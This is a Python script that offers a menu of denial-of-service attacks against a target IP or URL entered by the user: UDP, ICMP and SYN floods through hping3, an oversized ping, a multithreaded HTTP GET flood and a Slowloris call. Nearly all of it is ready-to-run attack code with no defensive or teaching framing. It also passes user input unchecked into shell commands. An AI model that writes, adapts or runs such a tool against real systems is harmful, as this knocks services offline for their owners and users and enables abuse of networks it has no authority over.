import os
from threading import Thread
import requests

def udp_flood(target_ip, port):
    os.system(f"hping3 --flood --udp -p {port} {target_ip}")

def icmp_flood(target_ip):
    os.system(f"hping3 --flood --icmp {target_ip}")

def syn_flood(target_ip, port):
    os.system(f"hping3 --flood -S -p {port} {target_ip}")

def ping_of_death(target_ip):
    os.system(f"ping -s 65507 {target_ip}")

def http_flood(target_url, threads):
    def flood():
        while True:
            try:
                requests.get(target_url)
            except requests.exceptions.RequestException:
                pass

    for _ in range(threads):
        Thread(target=flood).start()

def slowloris_attack(target_ip):
    os.system(f"slowloris {target_ip}")

def main():
    print("Select the type of DDoS attack:")
    print("1. UDP Flood")
    print("2. ICMP Flood")
    print("3. SYN Flood")
    print("4. Ping of Death")
    print("5. HTTP Flood")
    print("6. Slowloris Attack")

    choice = int(input("Enter your choice (1-6): "))
    target_ip = input("Enter the target IP: ")

    if choice == 5:
        target_url = input("Enter the target URL: ")
        threads = int(input("Enter the number of threads: "))
        http_flood(target_url, threads)
    else:
        if choice in [1, 3]:
            port = int(input("Enter the target port: "))

        if choice == 1:
            udp_flood(target_ip, port)
        elif choice == 2:
            icmp_flood(target_ip)
        elif choice == 3:
            syn_flood(target_ip, port)
        elif choice == 4:
            ping_of_death(target_ip)
        elif choice == 6:
            slowloris_attack(target_ip)

if __name__ == "__main__":
    main()
